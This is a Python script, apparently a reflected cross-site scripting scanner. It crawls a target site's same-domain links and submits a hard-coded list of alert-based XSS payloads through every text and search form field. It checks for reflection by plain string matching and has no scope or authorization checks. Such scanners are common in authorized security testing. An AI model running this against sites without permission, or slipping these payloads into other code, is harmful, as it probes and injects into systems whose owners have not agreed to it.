import requests
from bs4 import BeautifulSoup
import argparse
from urllib.parse import urljoin, urlparse

# A list of simple to advanced XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "';alert('XSS');//",
    "\"';!--\"<XSS>=&{()}",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>"
]

def get_all_links(url):
    """
    Fetches all the links on a page.
    """
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        links = [urljoin(url, a['href']) for a in soup.find_all('a', href=True)]
        return links
    except requests.RequestException:
        return []

def get_all_forms(url):
    """
    Fetches all the forms on a page.
    """
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        return forms
    except requests.RequestException:
        return []

def scan_xss(url):
    """
    Scans a given URL for XSS vulnerabilities.
    """
    print(f"[*] Scanning {url} for XSS vulnerabilities...")
    
    forms = get_all_forms(url)
    vulnerable_found = False

    for form in forms:
        for payload in XSS_PAYLOADS:
            data = {}
            action = form.get('action')
            target_url = urljoin(url, action)

            # Build form data with payload
            for input_tag in form.find_all('input'):
                input_name = input_tag.get('name')
                input_type = input_tag.get('type', 'text')

                if input_type == 'text' or input_type == 'search':
                    data[input_name] = payload
                else:
                    data[input_name] = input_tag.get('value', '')
            
            # Send the request
            method = form.get('method', 'get').lower()
            if method == 'post':
                response = requests.post(target_url, data=data)
            else:
                response = requests.get(target_url, params=data)

            if payload in response.text:
                print(f"[!] XSS Vulnerability Found on {target_url} with payload: {payload}")
                vulnerable_found = True
    
    if not vulnerable_found:
        print("[*] No XSS vulnerabilities found on forms.")

def main():
    parser = argparse.ArgumentParser(description="Advanced XSS Scanner")
    parser.add_argument("-u", "--url", help="Target URL to scan", required=True)
    args = parser.parse_args()
    
    scanned_urls = set()
    urls_to_scan = [args.url]

    while urls_to_scan:
        current_url = urls_to_scan.pop(0)
        if current_url in scanned_urls:
            continue
        
        scanned_urls.add(current_url)
        scan_xss(current_url)
        
        links = get_all_links(current_url)
        for link in links:
            if urlparse(link).netloc == urlparse(args.url).netloc:
                urls_to_scan.append(link)

if __name__ == "__main__":
    main()